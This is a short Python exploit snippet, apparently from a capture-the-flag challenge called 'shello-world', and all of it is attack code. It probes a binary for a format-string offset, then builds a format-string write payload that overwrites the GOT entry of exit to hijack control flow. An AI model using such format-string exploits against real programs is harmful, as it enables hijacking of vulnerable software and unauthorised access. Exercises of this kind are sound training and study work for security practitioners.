#shello-world
#To find the address of input
for i in range(1, 50):
    io = start()
    payload = f'AAAAAAAA.%{i}$p'
    io.sendline(payload)
    resp = io.recvall()
    print(resp, i)
    if(b"0x4141" in resp):
        print(i)
        break
#found i = 6
payload = b'%4198774x%8$nAAA' + pack(elf.got.exit)

